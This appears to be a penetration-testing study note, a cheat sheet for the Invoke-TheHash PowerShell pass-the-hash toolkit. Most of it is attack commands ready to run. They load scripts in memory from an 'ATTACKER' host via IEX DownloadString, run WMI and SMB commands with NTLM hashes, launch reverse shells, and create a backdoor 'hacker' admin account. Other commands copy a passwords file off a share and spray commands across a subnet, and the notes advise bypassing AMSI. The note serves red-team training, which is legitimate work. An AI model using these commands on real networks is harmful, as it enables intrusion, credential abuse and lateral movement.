# Invoke-TheHash

**Tags:** `#invokethehash` `#passthehash` `#lateral` `#windows` `#powershell` `#wmi` `#smb`

PowerShell Pass-the-Hash toolkit for Windows-side lateral movement. Performs WMI and SMB command execution, SMB enumeration, and SMB file operations using NTLM hashes — no plaintext password required. Useful when you have a Windows foothold and need to move laterally without dropping Impacket tools.

**Source:** https://github.com/Kevin-Robertson/Invoke-TheHash
**Install:** `Import-Module .\Invoke-TheHash.psd1` from disk. In memory, dot-source each function file — you **cannot** `IEX` the `.psd1` (it's a manifest hashtable, not code): `IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-WMIExec.ps1')` (repeat per function you need).

```powershell
# Import module
Import-Module .\Invoke-TheHash.psd1

# WMI command execution via PTH
Invoke-WMIExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator -Hash NTLMhash -Command "whoami"
```

---

## Import

```powershell
# From disk (loads all functions)
Import-Module .\Invoke-TheHash.psd1

# In-memory (fileless) — dot-source the individual function files.
# The repo ships one .ps1 per function; there is no single combined script, and
# the .psd1 manifest is NOT executable, so IEX only works on the function .ps1s.
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-WMIExec.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-SMBExec.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-TheHash.ps1')   # multi-target wrapper
```

---

## Invoke-WMIExec — WMI Command Execution

```powershell
# Basic command execution
Invoke-WMIExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
  -Hash NTLMhash -Command "whoami" -Verbose

# Reverse shell (base64-encoded PS command)
Invoke-WMIExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
  -Hash NTLMhash -Command "powershell -e <BASE64_REVERSESHELL>"

# Add local admin
Invoke-WMIExec -Target 192.168.1.10 -Domain DOMAIN -Username julio \
  -Hash 64F12CDDAA88057E06A81B54E73B949B \
  -Command "net user hacker Password123! /add && net localgroup administrators hacker /add"

# Local account (no domain)
Invoke-WMIExec -Target 192.168.1.10 -Domain . -Username Administrator \
  -Hash NTLMhash -Command "whoami"
```

---

## Invoke-SMBExec — SMB Command Execution

Supports SMB1 and SMB2.1, with and without SMB signing.

```powershell
# Command execution via SMB
Invoke-SMBExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
  -Hash NTLMhash -Command "whoami" -Verbose

# Add local admin via SMB
Invoke-SMBExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
  -Hash NTLMhash \
  -Command "net user hacker Password123! /add && net localgroup administrators hacker /add" -Verbose

# Reverse shell
Invoke-SMBExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
  -Hash NTLMhash -Command "powershell -e <BASE64_REVERSESHELL>"
```

---

## Invoke-SMBEnum — SMB Enumeration

```powershell
# What to enumerate is selected with -Action (All,Group,NetSession,Share,User).
# Default is Share — pass -Action explicitly for anything else.
Invoke-SMBEnum -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
  -Hash NTLMhash -Action All -Verbose

# Enumerate specific items
Invoke-SMBEnum -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
  -Hash NTLMhash -Action User           # users
Invoke-SMBEnum -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
  -Hash NTLMhash -Action NetSession     # active sessions
# -Action Group enumerates a group's members; -Group names which (default Administrators)
Invoke-SMBEnum -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
  -Hash NTLMhash -Action Group -Group "Domain Admins"
```

---

## Invoke-SMBClient — SMB File Operations

For accounts that have share access but not command execution rights.

```powershell
# List share contents
Invoke-SMBClient -Domain DOMAIN -Username user -Hash NTLMhash \
  -Source \\server\share -Verbose

# Download file
Invoke-SMBClient -Domain DOMAIN -Username user -Hash NTLMhash \
  -Source \\server\share\passwords.xlsx -Destination C:\Windows\Temp\passwords.xlsx

# Upload file
Invoke-SMBClient -Domain DOMAIN -Username user -Hash NTLMhash \
  -Source C:\Windows\Temp\tool.exe -Destination \\server\share\tool.exe
```

---

## Invoke-TheHash — Multi-Target

Run WMIExec or SMBExec across a subnet.

```powershell
# WMI exec across subnet
Invoke-TheHash -Type WMIExec -Target 192.168.1.0/24 \
  -Username Administrator -Hash NTLMhash -Command "whoami"

# Exclude specific host
Invoke-TheHash -Type WMIExec -Target 192.168.1.0/24 -TargetExclude 192.168.1.50 \
  -Username Administrator -Hash NTLMhash -Command "whoami"

# SMBExec across subnet
Invoke-TheHash -Type SMBExec -Target 192.168.1.0/24 \
  -Username Administrator -Hash NTLMhash -Command "whoami"
```

---

## OPSEC Notes

- WMI execution generates Event ID **4624** (logon type 3) + WMI activity logs on target
- SMBExec installs a service — Event ID **7045** on target
- PowerShell module triggers AMSI — bypass before loading (`Bypass-4MSI` in evil-winrm, or manual patch)
- Subnet scanning (`192.168.1.0/24`) generates many auth events across hosts

---

> [!note] **See also** — Linux/impacket equivalents of the same Pass-the-Hash execution: [[Tools/Lateral Movement/NetExec|NetExec]] (`-H`), [[Tools/Local System Management/wmiexec|wmiexec]], [[Tools/Lateral Movement/Evil WinRM|Evil WinRM]] (`-H`). Get the NT hash from [[Tools/Credential Dumping/mimikatz|mimikatz]]. PtH context and detection: [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]], [[Standards & Protocols/NTLM|NTLM]] (why the hash alone authenticates).

---

*Created: 2026-03-06*
*Updated: 2026-08-29*
*Model: claude-opus-5*
